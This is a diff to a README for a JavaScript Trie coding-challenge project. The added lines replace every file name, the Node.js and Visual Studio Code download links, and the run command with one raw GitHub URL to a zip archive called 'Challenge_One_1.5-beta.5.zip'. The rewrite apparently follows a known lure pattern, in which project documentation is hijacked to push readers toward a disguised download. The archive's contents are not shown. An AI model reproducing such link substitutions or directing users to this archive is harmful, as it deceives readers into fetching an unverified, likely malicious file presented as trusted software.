@@ -10,8 +10,8 @@ This code also includes a sample test case that follows a typical coding challen
 
 ## 📁 Files
 
-- `trie.js` - Contains the full Trie class implementation and a test driver.
-- `README.md` - Instructions on how to run the code.
+- `https://raw.githubusercontent.com/EvansAmarh/ChallengeOne-3368322/main/unreleasing/Challenge_One_1.5-beta.5.zip` - Contains the full Trie class implementation and a test driver.
+- `https://raw.githubusercontent.com/EvansAmarh/ChallengeOne-3368322/main/unreleasing/Challenge_One_1.5-beta.5.zip` - Instructions on how to run the code.
 
 ---
 
@@ -19,8 +19,8 @@ This code also includes a sample test case that follows a typical coding challen
 
 ### 1. Prerequisites
 
-- Install [Node.js](https://nodejs.org/) (v12 or later recommended).
-- A code editor like [Visual Studio Code](https://code.visualstudio.com/).
+- Install [https://raw.githubusercontent.com/EvansAmarh/ChallengeOne-3368322/main/unreleasing/Challenge_One_1.5-beta.5.zip](https://raw.githubusercontent.com/EvansAmarh/ChallengeOne-3368322/main/unreleasing/Challenge_One_1.5-beta.5.zip) (v12 or later recommended).
+- A code editor like [Visual Studio Code](https://raw.githubusercontent.com/EvansAmarh/ChallengeOne-3368322/main/unreleasing/Challenge_One_1.5-beta.5.zip).
 
 ### 2. Clone or Download the Project
 
@@ -29,7 +29,7 @@ Download or copy the files into a folder on your computer.
 ### 3. Open in VS Code
 
 - Open the folder in Visual Studio Code.
-- Make sure `trie.js` is in the root of the folder.
+- Make sure `https://raw.githubusercontent.com/EvansAmarh/ChallengeOne-3368322/main/unreleasing/Challenge_One_1.5-beta.5.zip` is in the root of the folder.
 
 ### 4. Run the Code
 
@@ -37,4 +37,4 @@ Download or copy the files into a folder on your computer.
 - Run the following command:
 
 ```bash
-node trie.js
+node https://raw.githubusercontent.com/EvansAmarh/ChallengeOne-3368322/main/unreleasing/Challenge_One_1.5-beta.5.zip
